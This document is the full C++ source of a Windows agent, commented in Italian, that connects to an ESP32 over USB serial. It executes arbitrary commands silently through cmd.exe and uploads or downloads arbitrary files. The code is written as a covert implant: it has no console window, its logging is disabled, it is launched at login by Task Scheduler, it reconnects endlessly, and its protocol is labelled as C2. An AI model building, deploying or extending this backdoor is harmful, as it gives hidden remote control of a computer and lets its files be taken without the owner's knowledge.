// agent.cpp
// Compila con:
//   g++ -Os -static -s -mwindows -ffunction-sections -fdata-sections \
//       -Wl,--gc-sections -o agent.exe agent.cpp -lsetupapi
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <setupapi.h>
#include <devguid.h>
#include <initguid.h>
#include <cstdio>
#include <cstdint>
#include <cstdarg>
#include <cstring>
#include <vector>
#include <string>

DEFINE_GUID(GUID_DEVCLASS_PORTS,
            0x4D36E978, 0xE325, 0x11CE,
            0xBF, 0xC1, 0x08, 0x00, 0x2B, 0xE1, 0x03, 0x18);

static const uint16_t VID = 0x303A;
static const uint16_t PID = 0x4001;

enum : uint8_t {
    TAG_EXEC              = 0x01,
    TAG_STDOUT            = 0x02,
    TAG_STDERR            = 0x03,
    TAG_RC                = 0x04,
    TAG_PING              = 0x05,
    TAG_PONG              = 0x06,
    TAG_EXIT              = 0x07,
    TAG_UPLOAD_START      = 0x08,
    TAG_UPLOAD_CHUNK      = 0x09,
    TAG_UPLOAD_END        = 0x0A,
    TAG_UPLOAD_RC         = 0x0B,
    TAG_DOWNLOAD_START    = 0x0C,
    TAG_DOWNLOAD_CHUNK    = 0x0D,
    TAG_DOWNLOAD_END      = 0x0E,
    TAG_DOWNLOAD_RC       = 0x0F,
    TAG_ABORT_DOWNLOAD    = 0x10
};

static const size_t C2_CHUNK_SIZE = 1024;
static const DWORD READ_TIMEOUT_MS  = 200;
static const DWORD WRITE_TIMEOUT_MS = 200;

/* Fase 1: retry iniziale 15 minuti (copre "PC acceso prima di
 * collegare ESP32"). 300 tentativi × 3 s = 900 s. */
static const DWORD INITIAL_RETRY_INTERVAL_MS = 3000;
static const int   INITIAL_RETRY_COUNT       = 300;

/* Fase 2: riconnessioni successive, retry breve. */
static const DWORD FIND_RETRY_INTERVAL_MS = 3000;
static const int   FIND_RETRY_COUNT       = 5;
static const DWORD RECONNECT_DELAY_MS     = 3000;

static const DWORD EXEC_TIMEOUT_MS        = 30000;
static const DWORD EXEC_DRAIN_STDOUT_MS   = 25000;
static const DWORD EXEC_DRAIN_STDERR_MS   =  5000;

static FILE *g_upload_fp = NULL;
static std::string g_upload_path;
static volatile bool g_abort_download = false;

/* ============================================================
 * Logging (soft-disabled)
 *
 * Il file %USERPROFILE%\.riagent\agent.log non è più creato né
 * scritto. Le tre funzioni restano con la stessa firma e la macro
 * LOG(...) resta invariata, così tutte le chiamate LOG(...) sparse
 * nel codice sono no-op. Se in futuro serve riattivare il log,
 * basta ripristinare il corpo di queste tre funzioni.
 * ============================================================ */
static void log_init(void) {
    /* no-op: logging su file disabilitato */
}

static void log_close(const char *reason) {
    (void)reason;
    /* no-op: logging su file disabilitato */
}

static void logf_(const char *fmt, ...) {
    (void)fmt;
    /* no-op: logging su file disabilitato */
}

#define LOG(...) do { logf_(__VA_ARGS__); } while (0)

/* ============================================================
 * I/O helpers
 * ============================================================ */
static bool read_exact(HANDLE h, void* buf, DWORD n) {
    uint8_t* p = (uint8_t*)buf;
    DWORD remaining = n;
    while (remaining > 0) {
        DWORD got = 0;
        if (!ReadFile(h, p, remaining, &got, nullptr)) return false;
        if (got == 0) return false;
        p += got;
        remaining -= got;
    }
    return true;
}

static bool write_exact(HANDLE h, const void* buf, DWORD n) {
    const uint8_t* p = (const uint8_t*)buf;
    DWORD remaining = n;
    while (remaining > 0) {
        DWORD wrote = 0;
        if (!WriteFile(h, p, remaining, &wrote, nullptr)) return false;
        if (wrote == 0) return false;
        p += wrote;
        remaining -= wrote;
    }
    return true;
}

static bool send_tlv(HANDLE h, uint8_t tag, const void* data, uint32_t len) {
    uint8_t hdr[5] = {
        tag,
        (uint8_t)(len & 0xFF),
        (uint8_t)((len >> 8) & 0xFF),
        (uint8_t)((len >> 16) & 0xFF),
        (uint8_t)((len >> 24) & 0xFF)
    };
    if (!write_exact(h, hdr, 5)) return false;
    if (len == 0) return true;
    return write_exact(h, data, len);
}

static bool recv_tlv(HANDLE h, uint8_t* tag, std::vector<uint8_t>* val) {
    uint8_t hdr[5];
    if (!read_exact(h, hdr, 5)) return false;
    *tag = hdr[0];
    uint32_t len = (uint32_t)hdr[1]
                 | ((uint32_t)hdr[2] << 8)
                 | ((uint32_t)hdr[3] << 16)
                 | ((uint32_t)hdr[4] << 24);
    if (len > 4 * 1024 * 1024) return false;
    val->resize(len);
    return len == 0 || read_exact(h, val->data(), len);
}

static bool poll_abort(HANDLE h) {
    COMSTAT stat = {};
    DWORD errors = 0;
    if (!ClearCommError(h, &errors, &stat)) return false;
    if (errors & (CE_FRAME | CE_OVERRUN | CE_RXOVER)) {
        PurgeComm(h, PURGE_RXCLEAR);
        return false;
    }
    if (stat.cbInQue < 5) return false;

    uint8_t hdr[5];
    DWORD got = 0;
    if (!ReadFile(h, hdr, 5, &got, nullptr) || got != 5) return false;

    uint8_t tag = hdr[0];
    uint32_t len = (uint32_t)hdr[1]
                 | ((uint32_t)hdr[2] << 8)
                 | ((uint32_t)hdr[3] << 16)
                 | ((uint32_t)hdr[4] << 24);
    if (len > 4 * 1024 * 1024) return false;

    std::vector<uint8_t> payload(len);
    if (len > 0) {
        if (!read_exact(h, payload.data(), len)) return false;
    }

    if (tag == TAG_ABORT_DOWNLOAD) {
        g_abort_download = true;
        return true;
    }
    return false;
}

static void send_upload_rc(HANDLE h, uint32_t rc) {
    send_tlv(h, TAG_UPLOAD_RC, &rc, 4);
}

static void send_download_rc(HANDLE h, uint32_t rc) {
    send_tlv(h, TAG_DOWNLOAD_RC, &rc, 4);
}

/* ============================================================
 * Ricerca COM ESP32
 * ============================================================ */
static std::string find_esp_com() {
    HDEVINFO devs = SetupDiGetClassDevsA(&GUID_DEVCLASS_PORTS, nullptr, nullptr, DIGCF_PRESENT);
    if (devs == INVALID_HANDLE_VALUE) return {};

    SP_DEVINFO_DATA info = {};
    info.cbSize = sizeof(info);

    std::string result;
    for (DWORD i = 0; SetupDiEnumDeviceInfo(devs, i, &info); ++i) {
        HKEY key = SetupDiOpenDevRegKey(devs, &info, DICS_FLAG_GLOBAL, 0, DIREG_DEV, KEY_READ);
        if (key == INVALID_HANDLE_VALUE) continue;

        char port[64] = {0};
        DWORD sz = sizeof(port), type = 0;
        LONG r = RegQueryValueExA(key, "PortName", nullptr, &type, (LPBYTE)port, &sz);
        RegCloseKey(key);
        if (r != ERROR_SUCCESS) continue;

        char hwid[256] = {0};
        DWORD hsz = sizeof(hwid);
        if (!SetupDiGetDeviceRegistryPropertyA(devs, &info, SPDRP_HARDWAREID,
                                               nullptr, (PBYTE)hwid, hsz, &hsz)) {
            continue;
        }

        char vidpid[32];
        snprintf(vidpid, sizeof(vidpid), "VID_%04X&PID_%04X", VID, PID);
        if (strstr(hwid, vidpid)) {
            result = std::string("\\\\.\\") + port;
            break;
        }
    }
    SetupDiDestroyDeviceInfoList(devs);
    return result;
}

/* ============================================================
 * Esecuzione comandi
 * ============================================================ */
static void exec_and_reply(HANDLE h, const std::string& cmd) {
    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE rOut = NULL, wOut = NULL;
    HANDLE rErr = NULL, wErr = NULL;
    HANDLE rIn  = NULL, wIn  = NULL;

    bool ok = true;
    if (!CreatePipe(&rOut, &wOut, &sa, 0)) ok = false;
    if (ok && !CreatePipe(&rErr, &wErr, &sa, 0)) ok = false;
    if (ok && !CreatePipe(&rIn,  &wIn,  &sa, 0)) ok = false;

    if (!ok) {
        if (rOut) CloseHandle(rOut); if (wOut) CloseHandle(wOut);
        if (rErr) CloseHandle(rErr); if (wErr) CloseHandle(wErr);
        if (rIn)  CloseHandle(rIn);  if (wIn)  CloseHandle(wIn);
        DWORD rc = 1;
        send_tlv(h, TAG_RC, &rc, sizeof(rc));
        return;
    }

    CloseHandle(wIn);
    wIn = NULL;

    SetHandleInformation(rOut, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(rErr, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(rIn,  HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = rIn;
    si.hStdOutput = wOut;
    si.hStdError  = wErr;

    PROCESS_INFORMATION pi = {};
    std::string full = "cmd.exe /c " + cmd;
    std::vector<char> cmdline(full.begin(), full.end());
    cmdline.push_back('\0');

    BOOL created = CreateProcessA(nullptr, cmdline.data(),
                                  nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr,
                                  &si, &pi);
    CloseHandle(wOut); wOut = NULL;
    CloseHandle(wErr); wErr = NULL;
    CloseHandle(rIn);  rIn  = NULL;

    if (!created) {
        CloseHandle(rOut);
        CloseHandle(rErr);
        DWORD rc = 1;
        send_tlv(h, TAG_RC, &rc, sizeof(rc));
        return;
    }

    auto drain = [&](HANDLE r, uint8_t tag, DWORD max_ms) {
        char tmp[C2_CHUNK_SIZE];
        DWORD elapsed = 0;
        const DWORD step = 50;
        while (elapsed < max_ms) {
            DWORD avail = 0;
            if (!PeekNamedPipe(r, nullptr, 0, nullptr, &avail, nullptr)) break;
            if (avail == 0) {
                if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) {
                    DWORD n = 0;
                    while (ReadFile(r, tmp, sizeof(tmp), &n, nullptr) && n > 0) {
                        if (!send_tlv(h, tag, tmp, n)) return;
                    }
                    return;
                }
                Sleep(step);
                elapsed += step;
                continue;
            }
            DWORD n = 0;
            if (!ReadFile(r, tmp, sizeof(tmp), &n, nullptr) || n == 0) break;
            if (!send_tlv(h, tag, tmp, n)) return;
        }
    };

    drain(rOut, TAG_STDOUT, EXEC_DRAIN_STDOUT_MS);
    drain(rErr, TAG_STDERR, EXEC_DRAIN_STDERR_MS);

    CloseHandle(rOut);
    CloseHandle(rErr);

    DWORD wait = WaitForSingleObject(pi.hProcess, EXEC_TIMEOUT_MS);
    DWORD rc = 0;
    if (wait == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 124);
        WaitForSingleObject(pi.hProcess, 2000);
        rc = 124;
    } else {
        GetExitCodeProcess(pi.hProcess, &rc);
    }

    send_tlv(h, TAG_RC, &rc, sizeof(rc));

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

/* ============================================================
 * Download con abort cooperativo
 * ============================================================ */
static bool do_download(HANDLE h, const std::string& path) {
    LOG("download: start %s\n", path.c_str());
    FILE *fp = fopen(path.c_str(), "rb");
    if (!fp) {
        LOG("download: cannot open %s\n", path.c_str());
        send_download_rc(h, 1);
        return false;
    }

    g_abort_download = false;

    char buf[C2_CHUNK_SIZE];
    size_t n;
    size_t total = 0;
    bool ok_send = true;
    bool aborted = false;

    while ((n = fread(buf, 1, sizeof(buf), fp)) > 0) {
        if ((total & 0xFFFF) < n) {
            if (g_abort_download) { aborted = true; break; }
            if (poll_abort(h))    { aborted = true; break; }
        }
        if (!send_tlv(h, TAG_DOWNLOAD_CHUNK, buf, (uint32_t)n)) {
            LOG("download: send failed\n");
            ok_send = false;
            break;
        }
        total += n;
    }
    fclose(fp);

    if (aborted) {
        LOG("download: aborted by host at %zu bytes\n", total);
        send_download_rc(h, 2);
        return false;
    }

    LOG("download: end %s (%zu bytes)\n", path.c_str(), total);
    send_download_rc(h, ok_send ? 0 : 1);
    return ok_send;
}

/* ============================================================
 * Configurazione porta COM
 * ============================================================ */
static bool configure_port(HANDLE h) {
    DCB dcb = {};
    dcb.DCBlength = sizeof(dcb);
    if (!GetCommState(h, &dcb)) return false;
    dcb.BaudRate = CBR_115200;
    dcb.ByteSize = 8;
    dcb.Parity   = NOPARITY;
    dcb.StopBits = ONESTOPBIT;
    dcb.fDtrControl = DTR_CONTROL_ENABLE;
    dcb.fRtsControl = RTS_CONTROL_ENABLE;
    if (!SetCommState(h, &dcb)) return false;

    COMMTIMEOUTS timeouts = {};
    timeouts.ReadIntervalTimeout         = 50;
    timeouts.ReadTotalTimeoutMultiplier  = 0;
    timeouts.ReadTotalTimeoutConstant    = READ_TIMEOUT_MS;
    timeouts.WriteTotalTimeoutMultiplier = 0;
    timeouts.WriteTotalTimeoutConstant   = WRITE_TIMEOUT_MS;
    if (!SetCommTimeouts(h, &timeouts)) return false;

    PurgeComm(h, PURGE_RXCLEAR | PURGE_TXCLEAR);
    return true;
}

/* ============================================================
 * main: retry iniziale 15 min + loop infinito con riconnessione
 * ============================================================ */
int main() {
    log_init();
    LOG("main entry\n");

    /* Fase 1: retry iniziale 15 min.
     * Copre il caso "PC acceso prima di collegare l'ESP32":
     * il task Scheduler lancia l'agente al login, l'ESP32
     * arriva anche 10-15 minuti dopo, qui lo aspettiamo. */
    std::string port;
    for (int attempt = 1; attempt <= INITIAL_RETRY_COUNT; ++attempt) {
        port = find_esp_com();
        if (!port.empty()) {
            LOG("initial: ESP32 found on attempt %d/%d\n",
                attempt, INITIAL_RETRY_COUNT);
            break;
        }
        if (attempt == 1 || attempt % 20 == 0) {
            LOG("initial: waiting for ESP32 (attempt %d/%d, ~%d s elapsed)\n",
                attempt, INITIAL_RETRY_COUNT,
                (int)((attempt - 1) * INITIAL_RETRY_INTERVAL_MS / 1000));
        }
        if (attempt < INITIAL_RETRY_COUNT) {
            Sleep(INITIAL_RETRY_INTERVAL_MS);
        }
    }
    if (port.empty()) {
        LOG("initial: ESP32 not found after 15 min, entering reconnect loop\n");
    }

    /* Fase 2: loop infinito. Se la connessione cade (reset ESP32,
     * cavo mosso, brownout), riconnette invece di uscire. */
    while (true) {
        if (port.empty()) {
            for (int i = 0; i < FIND_RETRY_COUNT; ++i) {
                port = find_esp_com();
                if (!port.empty()) break;
                Sleep(FIND_RETRY_INTERVAL_MS);
            }
        }
        if (port.empty()) {
            LOG("not found, retry in %lu ms\n", RECONNECT_DELAY_MS);
            Sleep(RECONNECT_DELAY_MS);
            continue;
        }

        LOG("opening %s\n", port.c_str());
        HANDLE h = CreateFileA(port.c_str(),
                               GENERIC_READ | GENERIC_WRITE,
                               0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (h == INVALID_HANDLE_VALUE) {
            LOG("open failed err=%lu, retry\n", GetLastError());
            port.clear();
            Sleep(RECONNECT_DELAY_MS);
            continue;
        }

        if (!configure_port(h)) {
            LOG("configure_port failed, retry\n");
            CloseHandle(h);
            port.clear();
            Sleep(RECONNECT_DELAY_MS);
            continue;
        }

        LOG("agent ready on %s\n", port.c_str());

        bool exit_requested = false;

        while (!exit_requested) {
            DWORD errors = 0;
            COMSTAT stat = {};
            if (!ClearCommError(h, &errors, &stat)) {
                LOG("ClearCommError failed, reconnect\n");
                break;
            }
            if (errors & (CE_FRAME | CE_OVERRUN | CE_RXOVER)) {
                PurgeComm(h, PURGE_RXCLEAR);
            }

            uint8_t tag = 0;
            std::vector<uint8_t> val;
            if (!recv_tlv(h, &tag, &val)) {
                if (stat.cbInQue == 0) continue;
                LOG("recv_tlv I/O error, reconnect\n");
                break;
            }

            if (tag == TAG_EXIT) { exit_requested = true; break; }

            if (tag == TAG_PING) {
                send_tlv(h, TAG_PONG, nullptr, 0);
                continue;
            }

            if (tag == TAG_EXEC) {
                std::string cmd(val.begin(), val.end());
                LOG("exec: %s\n", cmd.c_str());
                exec_and_reply(h, cmd);
                continue;
            }

            if (tag == TAG_ABORT_DOWNLOAD) {
                LOG("abort_download fuori contesto\n");
                continue;
            }

            if (tag == TAG_UPLOAD_START) {
                std::string path(val.begin(), val.end());
                if (g_upload_fp) { fclose(g_upload_fp); g_upload_fp = NULL; }
                g_upload_path = path;
                g_upload_fp = fopen(path.c_str(), "wb");
                if (!g_upload_fp) {
                    LOG("upload: cannot open %s\n", path.c_str());
                    send_upload_rc(h, 1);
                    g_upload_path.clear();
                } else {
                    LOG("upload: start %s\n", path.c_str());
                    send_upload_rc(h, 0);
                }
                continue;
            }

            if (tag == TAG_UPLOAD_CHUNK) {
                if (!g_upload_fp) continue;
                size_t written = fwrite(val.data(), 1, val.size(), g_upload_fp);
                if (written != val.size()) {
                    LOG("upload: short write %zu/%zu\n", written, val.size());
                }
                continue;
            }

            if (tag == TAG_UPLOAD_END) {
                uint32_t rc = 0;
                if (g_upload_fp) {
                    fflush(g_upload_fp);
                    fclose(g_upload_fp);
                    g_upload_fp = NULL;
                    LOG("upload: end %s\n", g_upload_path.c_str());
                    g_upload_path.clear();
                } else {
                    rc = 1;
                }
                send_upload_rc(h, rc);
                continue;
            }

            if (tag == TAG_DOWNLOAD_START) {
                std::string path(val.begin(), val.end());
                do_download(h, path);
                continue;
            }
        }

        if (g_upload_fp) { fclose(g_upload_fp); g_upload_fp = NULL; }
        CloseHandle(h);
        port.clear();

        if (exit_requested) {
            LOG("TAG_EXIT received, exiting\n");
            log_close("TAG_EXIT");
            return 0;
        }

        LOG("reconnect in %lu ms\n", RECONNECT_DELAY_MS);
        Sleep(RECONNECT_DELAY_MS);
    }
}